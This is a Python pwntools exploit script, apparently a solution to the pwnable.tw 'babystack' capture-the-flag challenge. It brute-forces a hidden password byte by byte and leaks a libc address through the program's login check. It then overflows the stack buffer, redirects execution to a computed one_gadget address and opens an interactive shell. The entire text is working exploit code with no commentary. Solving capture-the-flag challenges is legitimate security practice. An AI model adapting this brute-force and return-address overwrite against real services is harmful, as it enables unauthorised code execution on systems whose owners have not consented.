from pwn import *
import time
s=process("./babystack", env={'LD_PRELOAD':'./libc_64.so.6'})
#s=remote("chall.pwnable.tw",10205)

pwd=''
for j in range(16):
	print(j)
	for i in range(0x01, 0x100):
		s.send("1")
		s.recvuntil(":")
		s.send(pwd+chr(i)+"\n")
		a=s.recvuntil(">>")
		print(i,a)
		if(a.find("Success")!=-1):
			print("GOOD")
			pwd+=chr(i)
			#print(hexdump(pwd))
			s.send("1")
			break
		if (i==0xFF):
			pwd+="\x00"

print(hexdump(pwd))

s.send("1")
s.recvuntil(":")
s.send("a"*0x40+pwd+"c"*8)
print(s.recv(1024))
s.send("1")
s.recvuntil(":")
s.send("\n")
print(s.recv(1024))
s.send("3")
s.recvuntil(":")
s.send("c"*0x3f)
print(s.recv(1024))
s.send("1")
print(s.recv(1024))
libc=""
#pause()
for j in range(6):
   print(j)
   for i in range(0x01, 0x100):
      s.send("1")
      s.recvuntil(":")
      s.send(pwd+"1"+"c"*7+libc+chr(i)+"\n")
      a=s.recvuntil(">>")
      print(i,a)
      if(a.find("Success")!=-1):
         libc+=chr(i)
         #print(hexdump(libc))
         s.send("1")
         break
      if (i==0xFF):
         libc+="\x00"
         print(hexdump(libc))
libc=u64(libc+"\x00\x00")
one_gadget=libc-324-0x6fe70+0x45216
print(hex(one_gadget))

s.send("1")
s.recvuntil(":")
payload=pwd+"1"+"c"*7+"\x00"+"d"*8
payload+="t"*(0x40-len(payload))
payload+=pwd
payload+="A"*8+"B"*8+"C"*8+p64(one_gadget)

s.send(payload)

s.send("3\n")
s.recvuntil(":")
s.send("b"*0x3f)
#pause()
s.send("2\n")

s.interactive()

s.close()
